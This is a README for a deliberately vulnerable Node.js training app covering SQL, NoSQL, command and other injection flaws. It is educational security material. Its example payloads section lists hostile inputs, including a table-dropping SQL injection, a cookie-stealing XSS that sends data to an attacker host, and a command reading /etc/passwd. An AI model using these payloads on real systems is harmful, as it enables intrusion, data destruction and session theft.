# Sentinel: Vulnerable Web Application

A deliberately vulnerable web application designed for educational purposes to demonstrate common web vulnerabilities and how they can be exploited. This application is intended for cybersecurity students, professionals, and enthusiasts to practice identifying and exploiting web vulnerabilities in a controlled environment.

![Security Training](https://img.shields.io/badge/Security-Training-red)
![Node.js](https://img.shields.io/badge/Node.js-14+-green)
![Express](https://img.shields.io/badge/Express-4.x-blue)
![Educational](https://img.shields.io/badge/Purpose-Educational-yellow)

## ⚠️ WARNING

This application intentionally contains security vulnerabilities. **DO NOT** deploy this in a production environment or on a publicly accessible server. It should only be run locally or in a secured, isolated environment for educational purposes.

## Overview

Sentinel is built using Node.js and Express, with both MySQL and MongoDB databases to demonstrate different types of injection attacks. Each vulnerability has a dedicated page with interactive elements allowing users to test and learn about different attack vectors.

## Vulnerabilities Demonstrated

This application includes demonstrations of:

1. **SQL Injection (SQLi)** - Manipulating SQL queries through user inputs
2. **NoSQL Injection** - Attacking MongoDB queries with crafted inputs
3. **Cross-Site Scripting (XSS)** - Injecting malicious scripts executed by the browser
4. **Command Injection** - Executing unauthorized system commands
5. **Server-Side Request Forgery (SSRF)** - Forcing the server to make unintended requests
6. **Local File Inclusion (LFI)** - Accessing files on the server through path manipulation
7. **HTML Injection** - Inserting unauthorized HTML content
8. **CSS Injection** - Manipulating page styles for malicious purposes

## Getting Started

### Prerequisites

- Node.js (v14 or higher)
- MongoDB
- MySQL

### Installation

1. Clone the repository
   ```bash
   git clone https://github.com/yourusername/sentinel-vulnerable-app.git
   cd sentinel-vulnerable-app
   ```

2. Install dependencies
   ```bash
   npm install
   ```

3. Set up MySQL:
   ```sql
   CREATE DATABASE Logging;
   USE Logging;
   CREATE TABLE User (
     id INT AUTO_INCREMENT PRIMARY KEY,
     username VARCHAR(50) NOT NULL,
     password VARCHAR(50) NOT NULL
   );
   
   -- Add sample user data
   INSERT INTO User (username, password) VALUES 
     ('admin', 'admin123'),
     ('user', 'password123'),
     ('test', 'test123');
   ```

4. Set up MongoDB:
   ```bash
   # Start MongoDB shell
   mongosh
   
   # Create and use database
   use testdb
   
   # Create collection and add sample documents
   db.myCollection.insertMany([
     { username: "admin", password: "adminpass", role: "admin" },
     { username: "user1", password: "userpass", role: "user" },
     { username: "guest", password: "guestpass", role: "guest" }
   ])
   ```

5. Configure database connections:
   - Review and update database connection settings in `config/mysql.js` and `config/mongodb.js` if necessary

6. Start the application:
   ```bash
   npm start
   ```

7. Access the application at: `http://localhost:3001`

## For Educators

### Teaching Features

Each vulnerability demonstration includes:
- Client-side interface to interact with the vulnerable endpoint
- Server-side vulnerable code with comments explaining the security issues
- Educational notes explaining the vulnerability mechanisms and impact
- Example payloads to demonstrate exploitation techniques
- Secure implementations for comparison and security best practices

### Suggested Lesson Structure

1. **Introduction to the vulnerability**: Theory and background
2. **Live demonstration**: Using the Sentinel application to show the vulnerability
3. **Guided exploitation**: Walking students through crafting their own payloads
4. **Security analysis**: Identifying the root cause in the code
5. **Remediation strategies**: Discussing proper security controls and fixes
6. **Hands-on lab**: Allowing students to experiment with different attack vectors

### Example Attack Payloads

- **SQL Injection**: `admin' OR '1'='1` or `admin'; DROP TABLE users; --`
- **NoSQL Injection**: `{"username": {"$ne": null}, "password": {"$ne": null}}`
- **XSS**: `<script>alert(document.cookie)</script>` or `<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
- **Command Injection**: `; cat /etc/passwd` or `& whoami`
- **SSRF**: Input with internal URLs like `http://localhost:3001/latest/meta-data`

## Educational Resources

### Learning Resources

To learn more about these vulnerabilities and how to prevent them, visit:
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/) - Current most critical web application security risks
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Comprehensive web application security testing guide
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free interactive labs
- [HackerOne CTF Challenges](https://ctf.hacker101.com/) - Capture the flag challenges for web security
- [Cybrary](https://www.cybrary.it/) - Free cybersecurity training and career development

### Reference Materials

- [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security.html) - Best practices for secure web development
- [SANS SWAT Checklist](https://www.sans.org/cloud-security/securing-web-application-technologies/) - Securing web applications
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/) - Node.js specific security guidelines
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html) - Securing Express applications

## Project Structure

```
├── app.js                   # Main application entry point
├── package.json             # Project dependencies and scripts
├── config/                  # Database configuration
│   ├── mongodb.js           # MongoDB connection setup
│   └── mysql.js             # MySQL connection setup
├── handlers/                # Route handlers for vulnerable endpoints
│   ├── cmdHandler.js        # Command injection handler
│   ├── lfiHandler.js        # Local file inclusion handler
│   ├── nosqlHandler.js      # NoSQL injection handler
│   ├── sqlHandler.js        # SQL injection handler
│   └── ssrfHandler.js       # SSRF handler
└── public/                  # Static web pages
    ├── cmd.html             # Command injection page
    ├── error.html           # Error page
    ├── index.html           # Home page
    ├── lfi.html             # Local file inclusion page
    ├── nosqli.html          # NoSQL injection page
    ├── sqli.html            # SQL injection page
    ├── ssrf.html            # SSRF page
    └── xss.html             # XSS page
```

## How to Contribute

Contributions to improve this educational tool are welcome. You might:

1. Add new vulnerability demonstrations
2. Improve existing vulnerability examples
3. Enhance documentation or educational notes
4. Fix bugs or improve the user interface

To contribute:
1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is for educational purposes only. Use responsibly.

## Disclaimer

The creators of this application are not responsible for any misuse of the techniques demonstrated. This tool should only be used for legitimate security education and testing with proper permission.